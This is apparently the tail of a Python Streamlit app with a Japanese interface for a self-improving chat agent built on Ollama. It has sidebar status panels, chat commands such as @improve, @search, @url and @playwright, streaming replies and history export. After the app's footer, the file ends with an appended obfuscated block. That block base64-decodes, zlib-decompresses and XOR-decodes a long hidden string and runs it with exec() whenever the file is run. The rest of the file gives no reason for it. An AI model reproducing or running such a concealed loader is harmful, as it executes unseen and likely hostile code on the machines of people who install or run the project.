                    with st.expander(f"{status_icon} {improvement_type} - {timestamp[:19]}"):
                        st.write(f"**トリガー理由**: {trigger_reason}")
                        st.write(f"**詳細**: {details}")
                        st.write(f"**成功**: {'はい' if success else 'いいえ'}")
            else:
                st.info("📋 自動改善履歴はまだありません")
                
        except Exception as e:
            st.error(f"履歴取得エラー: {str(e)}")
    
    # 継続学習ループの状態
    if st.button("🔄 継続学習状態"):
        try:
            learning_status = st.session_state.self_improving_agent._evaluate_learning_status()
            
            if learning_status:
                st.success("🔄 継続学習状態")
                
                # 学習領域ごとの進捗
                for area, count in learning_status.items():
                    area_name = area.replace('_', ' ').title()
                    if count > 0:
                        st.metric(
                            label=area_name,
                            value=count,
                            delta="学習済み"
                        )
                    else:
                        st.metric(
                            label=area_name,
                            value=0,
                            delta="未学習"
                        )
                
                # 次の学習予定
                next_learning = st.session_state.self_improving_agent.conversation_count % 10
                if next_learning == 0:
                    st.success("🎯 次の継続学習ループが実行されます")
                else:
                    st.info(f"🎯 次の継続学習まで: {10 - next_learning}回")
            else:
                st.info("🔄 学習状態を取得できませんでした")
                
        except Exception as e:
            st.error(f"学習状態取得エラー: {str(e)}")
    
    # 会話履歴をクリア
    st.markdown("---")
    if st.button("🗑️ 会話履歴をクリア"):
        st.session_state.messages = []
        st.rerun()
    
    # システム情報
    st.markdown("---")
    st.header("📊 システム情報")
    
    # セッションID
    st.write(f"**セッションID**: `{st.session_state.self_improving_agent.session_id[:8]}...`")
    
    # 選択モデル
    st.write(f"**選択モデル**: {st.session_state.model_name}")
    
    # 会話数
    if hasattr(st.session_state.self_improving_agent, 'conversation_count'):
        st.write(f"**会話数**: {st.session_state.self_improving_agent.conversation_count}")
    
    # チューニングデータの概要
    try:
        tuning_data = st.session_state.self_improving_agent.get_tuning_data(limit=5)
        if tuning_data:
            st.subheader("🧬 チューニングデータ")
            for data in tuning_data:
                with st.expander(f"📊 {data['data_type']} (重要度: {data['importance']})"):
                    st.write(f"**内容**: {data['content'][:100]}...")
                    st.write(f"**ソース**: {data['source']}")
                    st.write(f"**作成日時**: {data['created_at'][:19]}")
                    st.write(f"**使用回数**: {data['used_count']}")
        else:
            st.info("🧬 チューニングデータはまだありません")
    except Exception as e:
        st.error(f"チューニングデータ取得エラー: {str(e)}")
    
    # Ollama接続状況
    st.markdown("---")
    st.header("✅ Ollama接続状況")
    
    try:
        # 利用可能なモデルを取得
        models = ollama.list()
        available_models = models.get('models', [])
        
        if available_models:
            st.success("**接続**: 成功")
            st.write(f"**利用可能モデル数**: {len(available_models)}")
            
            # モデル一覧を表示
            with st.expander("📋 利用可能モデル"):
                for model in available_models:
                    model_name = model.get('name', 'Unknown')
                    model_size = model.get('size', 0)
                    size_mb = model_size / (1024 * 1024) if model_size > 0 else 0
                    st.write(f"- {model_name} ({size_mb:.1f} MB)")
        else:
            st.warning("**接続**: 警告 - モデルが見つかりません")
            st.write("**利用可能モデル数**: 0")
    except Exception as e:
        st.error("**接続**: 失敗")
        st.error(f"エラー詳細: {str(e)}")

# メイン画面
col1, col2 = st.columns([2, 1])

with col1:
    st.header("💬 チャット")
    
    # メッセージ履歴の表示
    for message in st.session_state.messages:
        with st.chat_message(message["role"]):
            st.markdown(message["content"])
            if "timestamp" in message:
                st.caption(f"送信時刻: {message['timestamp']}")
    
    # ユーザー入力
    if prompt := st.chat_input("メッセージを入力してください..."):
        # ユーザーメッセージを追加
        user_message = {
            "role": "user",
            "content": prompt,
            "timestamp": datetime.now().strftime("%H:%M:%S")
        }
        st.session_state.messages.append(user_message)
        
        # ユーザーメッセージを表示
        with st.chat_message("user"):
            st.markdown(prompt)
            st.caption(f"送信時刻: {user_message['timestamp']}")
        
        # AI応答を生成
        with st.chat_message("assistant"):
            with st.spinner("🧠 AIエージェントが推論中..."):
                try:
                    # 自己改善コマンドの処理
                    if prompt.startswith("@improve"):
                        improvement_request = prompt[9:].strip()
                        if improvement_request:
                            st.info("🧠 **自己改善コマンド実行中** - エージェントが自分自身を改善しています...")
                            
                            success, message, improved_prompt = st.session_state.self_improving_agent.auto_improve_prompt(improvement_request)
                            
                            if success:
                                st.session_state.system_prompt = improved_prompt
                                ai_response = f"""✅ **自己改善完了！**

**改善要求**: {improvement_request}

**新しいシステムプロンプト**:
```
{improved_prompt}
```

エージェントが正常に自己改善を完了しました。今後の応答は改善されたプロンプトに基づいて生成されます。"""
                                
                                st.success("✅ 自己改善が完了しました！")
                            else:
                                ai_response = f"❌ **自己改善に失敗しました**: {message}"
                                st.error(f"自己改善に失敗しました: {message}")
                        else:
                            ai_response = "❌ **改善要求が指定されていません**\n\n使用方法: `@improve 改善したい内容`\n\n例: `@improve より簡潔で分かりやすい回答をするように改善してください`"
                    
                    elif prompt.startswith("@search"):
                        search_query = prompt[8:].strip()
                        if search_query:
                            st.info("🔍 **ネット検索実行中** - 最新情報を取得しています...")
                            
                            search_result = st.session_state.self_improving_agent.web_search(search_query)
                            
                            ai_response = f"""🔍 **ネット検索結果**

**検索クエリ**: {search_query}

**検索結果**:
{search_result}

この情報を基に、より正確で最新の回答を提供できます。"""
                            
                            st.success("✅ ネット検索が完了しました！")
                        else:
                            ai_response = "❌ **検索クエリが指定されていません**\n\n使用方法: `@search 検索したい内容`\n\n例: `@search Python機械学習の最新トレンド`"
                    
                    elif prompt.startswith("@tuning"):
                        tuning_request = prompt[8:].strip()
                        if tuning_request:
                            st.info("🧬 **チューニングデータ操作中** - 学習データを管理しています...")
                            
                            # チューニングデータを追加
                            success, message = st.session_state.self_improving_agent.add_tuning_data(
                                "user_feedback", tuning_request, 0.8, "chat_command"
                            )
                            
                            if success:
                                ai_response = f"""🧬 **チューニングデータ追加完了**

**追加されたデータ**: {tuning_request}

**重要度**: 0.8
**ソース**: chat_command

このデータは今後の学習に活用され、エージェントの応答品質向上に貢献します。"""
                                
                                st.success("✅ チューニングデータが追加されました！")
                            else:
                                ai_response = f"❌ **チューニングデータ追加に失敗しました**: {message}"
                                st.error(f"チューニングデータ追加に失敗しました: {message}")
                        else:
                            ai_response = "❌ **チューニングデータが指定されていません**\n\n使用方法: `@tuning 学習させたい内容`\n\n例: `@tuning ユーザーの質問には常に具体的な例を含めて回答する`"
                    
                    elif prompt.startswith("@url"):
                        url_to_access = prompt[5:].strip()
                        if url_to_access:
                            st.info("🌐 **URLアクセス実行中** - 最新情報を取得しています...")
                            
                            url_result = st.session_state.self_improving_agent.access_url(url_to_access)
                            
                            ai_response = f"""🌐 **URLアクセス結果**

**アクセスURL**: {url_to_access}
**結果**:
{url_result}"""
                            
                            st.success("✅ URLアクセスが完了しました！")
                        else:
                            ai_response = "❌ **アクセスするURLが指定されていません**\n\n使用方法: `@url https://example.com`"
                    
                    elif prompt.startswith("@playwright"):
                        play_command = prompt[11:].strip()
                        if play_command:
                            st.info("🎭 **Playwright MCPコマンド実行中** - Webページを操作しています...")
                            
                            # コマンドを解析
                            command_parts = play_command.split(" ", 1)
                            operation = command_parts[0]
                            url = ""
                            selector = ""
                            action = ""
                            
                            if len(command_parts) > 1:
                                url_and_selector = command_parts[1].split(" ", 1)
                                url = url_and_selector[0]
                                if len(url_and_selector) > 1:
                                    selector = url_and_selector[1]
                                    if selector.startswith('"') and selector.endswith('"'):
                                        action = selector[1:-1]
                                    else:
                                        action = selector
                            else:
                                # コマンドが操作のみの場合
                                if operation == "navigate":
                                    url = "https://example.com" # デフォルトURL
                                elif operation == "screenshot":
                                    url = "https://example.com" # デフォルトURL
                                elif operation == "click":
                                    selector = ".button-class" # デフォルトセレクター
                                elif operation == "type":
                                    selector = ".input-class" # デフォルトセレクター
                                elif operation == "evaluate":
                                    action = "document.title" # デフォルトコード
                            
                            play_result = st.session_state.self_improving_agent.playwright_operation(operation, url, selector, action)
                            
                            ai_response = f"""🎭 **Playwright MCP操作結果**

**コマンド**: {play_command}
**結果**:
{play_result}"""
                            
                            st.success("✅ Playwright MCPコマンドが実行されました！")
                        else:
                            ai_response = "❌ **Playwright MCPコマンドが指定されていません**\n\n使用方法: `@playwright navigate https://example.com` または `@playwright screenshot` など"
                    
                    else:
                        # 通常の推論処理
                        # 推論エンジンでプロンプトを強化
                        reasoning_prompt = ReasoningEngine.generate_reasoning_prompt(prompt, st.session_state.messages)
                        
                        # システムプロンプトを含むメッセージを作成
                        messages = [{"role": "system", "content": st.session_state.system_prompt}]
                        messages.extend([{"role": msg["role"], "content": msg["content"]} 
                                      for msg in st.session_state.messages[-10:]])  # 最新10件
                        
                        # 推論プロンプトを追加
                        messages.append({"role": "user", "content": reasoning_prompt})
                        
                        # 推論ストリーミング表示用のプレースホルダー
                        reasoning_placeholder = st.empty()
                        full_reasoning = ""
                        
                        # 推論プロセスのストリーミング表示
                        st.info("🧠 **推論プロセス開始** - Chain-of-Thought推論を実行中...")
                        
                        # Ollamaで推論ストリーミング応答生成
                        try:
                            stream = ollama.chat(
                                model=st.session_state.model_name,
                                messages=messages,
                                stream=True
                            )
                            
                            # 推論ストリーミングレスポンスを処理
                            for chunk in stream:
                                if chunk and 'message' in chunk and 'content' in chunk['message']:
                                    content = chunk['message']['content']
                                    full_reasoning += content
                                    
                                    # リアルタイムで推論を表示（カーソル付き）
                                    reasoning_placeholder.markdown(full_reasoning + "▌")
                                    
                                    # ストリーミング効果を演出（短い待機）
                                    import time
                                    time.sleep(0.01)
                            
                            # 最終的な推論を表示（カーソルを削除）
                            reasoning_placeholder.markdown(full_reasoning)
                            
                            # 推論完了メッセージ
                            st.success("✅ **推論完了** - Chain-of-Thought推論が完了しました！")
                            
                            # 最終的なAI応答
                            ai_response = full_reasoning
                            
                        except Exception as stream_error:
                            # ストリーミングが失敗した場合のフォールバック
                            st.warning("⚠️ 推論ストリーミングに失敗しました。通常の推論生成に切り替えます。")
                            
                            # 通常の推論生成
                            response = ollama.chat(
                                model=st.session_state.model_name,
                                messages=messages
                            )
                            
                            ai_response = response["message"]["content"]
                            reasoning_placeholder.markdown(ai_response)
                            
                            st.info("ℹ️ 通常の推論生成が完了しました。")
                    
                    # AI応答を履歴に追加
                    ai_message = {
                        "role": "assistant",
                        "content": ai_response,
                        "timestamp": datetime.now().strftime("%H:%M:%S")
                    }
                    st.session_state.messages.append(ai_message)
                    
                except Exception as e:
                    error_msg = f"エラーが発生しました: {str(e)}"
                    st.error(error_msg)
                    
                    # エラーメッセージを履歴に追加
                    error_message = {
                        "role": "assistant",
                        "content": error_msg,
                        "timestamp": datetime.now().strftime("%H:%M:%S")
                    }
                    st.session_state.messages.append(error_message)

with col2:
    st.header("📝 会話履歴")
    
    if st.session_state.messages:
        # 会話履歴のサマリー
        for i, msg in enumerate(st.session_state.messages):
            role_icon = "👤" if msg["role"] == "user" else "🤖"
            timestamp = msg.get("timestamp", "")
            
            with st.expander(f"{role_icon} {msg['role'].title()} - {timestamp}"):
                st.markdown(msg["content"])
                
                # 削除ボタン
                if st.button(f"削除", key=f"delete_{i}"):
                    st.session_state.messages.pop(i)
                    st.rerun()
    else:
        st.info("まだ会話がありません。メッセージを送信してみましょう！")
    
    # 会話履歴のエクスポート
    if st.session_state.messages:
        st.markdown("---")
        st.markdown("### 📤 エクスポート")
        
        # JSON形式でエクスポート
        chat_data = {
            "model": st.session_state.model_name,
            "system_prompt": system_prompt,
            "timestamp": datetime.now().isoformat(),
            "messages": st.session_state.messages
        }
        
        st.download_button(
            label="💾 JSON形式でダウンロード",
            data=json.dumps(chat_data, ensure_ascii=False, indent=2),
            file_name=f"chat_history_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            mime="application/json"
        )

# フッター
st.markdown("---")
st.markdown("🤖 Advanced AI Agent - Powered by Ollama & Streamlit")

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = 'eNq9W19z3MaRTyzJPrmiy93VPSSvqbr44V4iUZZkSaS+xe6X2i+Bqg0Ku0ywPJomkyNNy6Z1pGQ7kSVSKZimb4khaoBdkiCxAJwqkrvp7hn8n12uZDssywQwMz093T3dv+4Z+v3YCwPdixq+eIpG6eNh5LnJc+D3WfJ8wCO2sJi8xT0edL2wnxIYHMSh57AopROmI3k0ch3fS157nsN7aeMg7PX8AyNk3w9YFJS+sjD0wnQKzzliaY9zP+76GZnoeBD4vUY39Pq6zQOGnOuyLXlv03ps1gu4eDz3XCaGxDw4hgmTEa/gVTQcB0FsOD2fuUHS+JcXL15tsyj23Ig1Gr/Xa/9du1+/VputX6//rDZXv67X7tXu1n9Rm6k9rF+t3dE/H3S7LNRrc7Wb+pZnM+Mwajg9HkWyZa2hw8//RQEPfKfPgmPPpi826+rIg3UwClhkwiqAbeY6nu27+6tbwHtHDMWfZrNZew+ng39z9Z/XZurv1B7ClI/02n14uQo83dJrt5BLHZru1W7Cy53aA8Hw3fq1+lvQ7W1gl/iUjQ/qN+pXgHQ6jd9NOdBXV3VNGIWW8YE/IQsGoSsNxjhYWLQZDGG0gk7ak/UqxHyXh6MSMejkR74L0nEdJoUQBWGn2Cs3LXYxiC4zNbBS351f0TqNMT2L7Ewxk2qWQdCdX8/NkQgg1ZtoukzPMBmIoqzohPraT6EExWoS0p1Go4GsWZbL+8zsDlynreOj5AQtrmL5t9Dqa/fQkNDmyKAEAWFXX+4k1oT0DNFkWfoqUW7kWMJ24IB8B4nI2mfBjr/vPt607RD8jBkPDnq+Yx2xUVv34sCH/ZjfFclEtV+Dtc+CgcOmQHuvzei1D3A7wP/nYCvM4B4RGwNs/hawjHvnjr7j9bjLC6RA8HIisBQd58pknjSs6hdnmbZ7ft8P4JtsNWANYJT4UWvrK8vLy0IVzLVjz3cDHL6X7Wl0PtFaq8Vj3+hz33VZMH/AQFUR8WY4Xr/ZrnYXrfNyhLEP7u+Ujwywu0Hf8D3VkH0PWTsA13xkDKLW+gLnzuIStxcX1xe7HznrKx8t/88nvOssLa8sfrjiTJg1jB1DaMZFXzeGRVwRzQbu2DWGo3M5vPUVe3K8EC8tbXz34Sbb/svwi53+hNkMG6fzwv0JXXrMw07ASOvPMC3ay+rj7Y2NCUOQO8/tgjvq+cEIRNYSK7pkSEwBygCZn3rhUUvYzG7OGHgUWBTSQM1oPVkThNLUCHTfzQwiM7AgHBV3OESe91JHPlO7r8PjndoHYMD36u8UeuL2hikxshv2oB9H5kXFezaxFQTVXNObS8ZybqlpD9+GxhVFg3BmOFLuUbA02KKPvVDuVRW1mIe8H8GgvfxGvmjS7oDP9PtstzDwrDPW56aizFzb97DmIrwwtsVvs8JOIvAqoyi8VfLJlaZjxm0WRqsXzSeeGwBEmH8xihnKgccxLInjpm+hYJtn1dFCaqvNV093XjQLrRNWBUr/z/oNcmCzEJ6vVxSv43+AA2qPIPDfAbeHof9+gcapHxyXBQOvXsxcE94FNvIGwepHyx0AbyBJAXZUIVe0WNLCkncgy22zY8iYo1RW2TB7Hrcjs0Bxshx+jQuu3SbY8hCBywP5P5AMQiDy9Pfq/woPdxEL6bXb+H6VhlytzZRhBgVBctDn/dPg8Gh/6IVaR4edmbXQ7tVU4IP7EdM3hg4jT2+Wh7R17aV75HqnsLcFjYmmm0VlogFSGfQwZOztjhnGaOaMAdRbSWEF98MKTfyU+ylON6IeY7G5bKx0UM4QpfqRMLFbJOvfobQLwx2wft8d5PxZWRzd5mMOaN3WeTcALMx7vZyL0y8y1s6anULU756cR6F73js2Lw/rfdb3BMyoX0XkAZ+R64cITjDIz2Hgv1N/G8L7HLS9D2jk6VaBaMHHErmcoy7I+/QYlqO7XkDdioKOUg8Iw4VoK+Cl6g8/P3zONg9fhTtfPfYBfn3uLp58e7J/HH16+MlXTzbWN798Hhw4n+yse+s7TxT+NHOcCCvOpvUnYPe4iBzwzbhvgw+OAtoBPXANWUMHYedydROozGhlubrtC/Yybnv/BpQ0W39XqFLiS6VeweGhDhpF39r3rCDkbsSdBJftDSnMDjG+5lQEEhjq3LX1odhrOFTr7JalVKG4pnDoZDCVnnvLu3uC7O74FV8mu0ZONP9FIX82j2cBbqNPA/GgF8QkED/qMLVM6OAzbBUcdacoLuFbyHkbkMWbofbN3jf2H7/Z/Sb6A7ot+If9FZxIN1X03kCr1PUS1ySpQPJjsjTn8KPtQRT53N0ZRQHrVzd/0fe3xfquEKyfA1G8g2gewgDmugDyUTQYDikE/BbDJPmAuQJRRUiB+HoToi095gjVb9CAQcRCSm0A3xO0Z+6Jqb3c2dje2vxiQ4SOUoP4qGkSD2ICl+/ybHPrU5J5J+0w4Pus2unl5qcb+Y6OhS612O2JtfnsWa5TushqPjQLnx6KwKlaaMEtRqQRS1RxYErxgNOC5jioX3wwO2h72WKFFYwnI7s1JgV3cN3XSHWispFoR0QcYS9WzAOIMGLDa+HA2n6JIggH88kDdcNHgZdoudfFe5663Kt+ZCWUc9p4zHtRCb37btdDz7KXWEWb1NdOldiWWmoXl75byOuRSqn+AV+g6ynDqI0vBr2YRa+KHMiVIxNlYVR9FcwlGxN6OC6brDpivDRehCVXnvwcAAw8mqhWdElUjroN/96v3aPUvH4dE/Cq5dH4GwRu0TZpj3+QGjNu+3eLBB+l5CQswOBxU1S1dGnl92AE7oKHOCZLtmR1cGz8B17+g2oGzyCQDVtfcCevRtiGWFE02BACaGRqLRY4rYRmGT4SHCfwXeqH5qoRAu9W1ZHjsJvAbSwgxWapxKbkhWwPSZSZmUbGJMto1O/57lFhcCVFLTEKrCCnOK7KBzTFPQ4ARGsNorAVHfOQtXAgGmUr58eKkLc6YcyjaILCvvZd2zuN8upKitlGJKMNldVkx1JdTbnGNIZmZXAjHLjmnhacY10auW/ta7tt3eExwg4L0qsYMizcOpBvsWH6KFOvDzuqLSvmMUTIxNRqDBAryV0OiwIbSFes5E1kCQ6wd8CdI32e9pE0kXfBH1+jjBQ+Ydn5l0mIaZTwZsJcSbYZyzIcKIDEWmN890IkSJpLRbW+FzneabOtN484WCJA7ZDb+BrxPg85Po3YEQfX6LsHAywtZQtvev3oiIaGPHK9EQ/Fqx8eDQLxOOLJYzbqpMdt/8SLAo+69Pk+t7krWOg7xzw4omm5y+1RSD2AQLl6lPO9uYVnkSj5mAYLRFTJx04hamC0CM7zgSKVVSEaiT5FwqXopGSqEhCmCAQFg4Ft+vLFk2oE8LrdiOE+S450DMiowfFB+ihnh5dB4Ih+ORuHb1Y6WDwYgRfwnhUxyEYAunb0lv7RwvIyuW/Rk4Fo9eWGYq0pqSX9f1fzxOFtZUlprKrRJRghkbAqyGJ+YqqEjcijTDlB0eC9XMTlFlZiD6MKiH4PJU+FktviKAih4BxFSdrSd0RQJP0kB1djs2XQ6a+oBjVDhwCzsjT1cvtZ7tipNB8Gl9uitHCb3MgcGME9CstzVKrB2DNLuc1bdJiQANIMQIIUK947y+C5c+yTRaZ95CezU4FRecNPaI+NAtBH4317YVHDHZLMg2h3uL5gqT4Xv1U97SBE/K4lZWWhMixttxI1tkLWYzxirZOlJeMTY5n6zMuX+VPfnYdJjHM/1irEsadl++gVNNWo4gi0+5+IwfWFN2FwfUErYpqcfj7jIfRRqSfsV7TAeegc/9SasImjeZgf1BHw0Ng/f40F50f/M9Qi5xv+AF4LBkRcojsgYFzVSlUDQjO03p9ULz1kKKeW4essNTf4n6EVMd3wzTkt6KSYQV0TID67C1C/IqtqMvam3Y+9PhNTZElEDKEIU1xT+3sOj6ehBnvl+h96vmtKMu30Kx5K06EyiClXBwcUHHInmEwjWXdnzOpSWCECEFWGZrLYA8uUhaFrtd9BQz6uTev8iQU2ZGUe8/y3hVZAYEzrNMYby5S0DnwqWWBvTR2ySmleQld9eyFpVcqwCAsIzb9F50mzaa8YsHFgdpufSbXjTQQpSbrKoF+AZs8Mw2jmIFjlwAmYCX12QmbQLpqQWru/LQKT+o2EwwpjG0J8eb4CT7/IS7XEHogQ2DAYYEFMyE2NApUqVZc3j4xv/fgx/DYLjGc5O3SzQqbI3GWDIZmBTCqx7lLmXuJHuucSS8lNLR7SdagKt7LBoAJDhdU1JIjcQjc1t7Lhjbgd/tjcDn8MbhWV9OQcFQ+HrqDhjz91pxpG3zsp6b3TmJRKq9PoiZvxkqp5auh0nmdX9+EaWPtZs3LTh6pZIj2InNH5+cnJSGw/R2b05STh30E+72NpFGA6FWJzN8OoNCQgPp6uwn68ifsypUVn0ZgR3KRbQu/K+2nJefS4PGL8rQYkSO/v0/m3SE6AHN5kfP1zf1x3Q3mer3ng86uJRZIzlA7zk4P8Tzdy5/hqe5t8dt/4cU/o3+BQvlILTEt/OWXkhT9X3N4nlrhwlp9WSpVO1yrX0Zr8u2/9//9uq7d1+LfVZspc6XQcknSwX7whMj1hZ+n5odN/vsyXnn84lnDxGFuarYmbpK1X78hoA3Y+iA+GPhiH+kaINooPghNoTiWh6CNW8xUbQb9sZaWLLuPKX2M9Qso9sE7X4Arn6HgZrFIA+BVE0wekSDw9AzD4FuzTB+JgVcLA3OHYv1Fif19fWdbp2txD6nwLncCMyPuFD5D2nZT+5GafdL455aEP/P6X4vHUteRa3rgDw8xVNmV7Au9sFjAnYHZbj478OEbPCT7YGaBkK26zwCWgkNpdukiCZStIWfzAoEvT00NmHDMZ5mop2fzpXRXnpZQ6E26KZScMaXfCKYpbpmNOG5xj5hxZ5es6Zvc1b+jcolrOjXJWmFEXR/BY3VNdskn7sXwJEAEnPkQB78dmRmtP0NnVW+KmJbGE4eKBTBCupvcK6ESjH1VvhQ1jP0Sfk5v5j9ktctPmo2h1qVqqV9XuJa0/lWqX6uK9tNm/grp0BER43zQK/F5PP+E9P2e0zY5yfM5sJ/JFVbu70gnkLhSoFFW0g1S6eCoZmKWCbKaPjv6H3EXXy63y9DWsEn/SS405zbf1bud1bkYVwRSGSXQH6Q7MQ6lG4Sypz52nO/n79JVsaezpUqVuNeWufR35ZLK5ENpam1JXZz9MgqehH1wqQcU1hAK0nFNGE7GDb6mOh6V3EoEmd2+sCsQwIGbhMgR3Ky+uVKqI0Kg4FCss1ndTWrjMMDxT7Mlp9qM8GhOsKE/sK3+eYPtO0KHDAQ0PVal+hi2TnEq3GfMRem+aDfwtIB3lXwnsCZq7GXaacmVTCZEMUMKAKtUEJwA4AmO1Ah4dmTmVdqYowSkrGeVyj6IMUzk1UWkCRZeMmejB5bXHwEvpJjz8cM9dAefp/ildblVBaDwQpmCbodHqETv+EKItjREoV90/wcilISl0Vo9Sq6+QB94mkHmfPAGu8ZH+5U61NJWu1wn9OLCKWAzeqO6YvPODCH+bloVB1rI6HYUPFW0qtJbNgYANdDrlwn4jDrMAerwtz8thJcKxqeYXB/16F7D4CQ/pT9Iiku73Az+ETIc+NDsfNxxIiwI9VSiWhi8yvZ9pSQ/LR4WKvz4j+GRqF6TSM9BOUzgDpMcAbJg88A6gPdHfmdbpfJz/k7BJC8XiAf2VTVaqm6g05eWKYizM6+MN4AIdfxsYoJgpRaveh8qPygw+tyCd/vKOKh5jXQ0ZZ3ZN5BWtai9xJu2Cwe229bGryJOjix2rOaqfbTzfevns2dTDwUWrhk8zmlw0oIJuj+9HeSJPtjc2X2xYW0+tr/+69dnTry+/aSNP3KdUyBSwRB2xZZ4HAAVUhxZQrpWVKzaiqpXPjumeZPrnbnTpVKQ6iQOmk+/GD4/dIvTaljhQmjJOF2snSZkvRypX7nvtOkMF/WBpIZEg/T0s7XpM2msPdarYz4FIrpCAHlCq8agky4af/Jkh/ingqt60LCRqWU0xbYIG8EqVKGR0/gFkGhSN'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
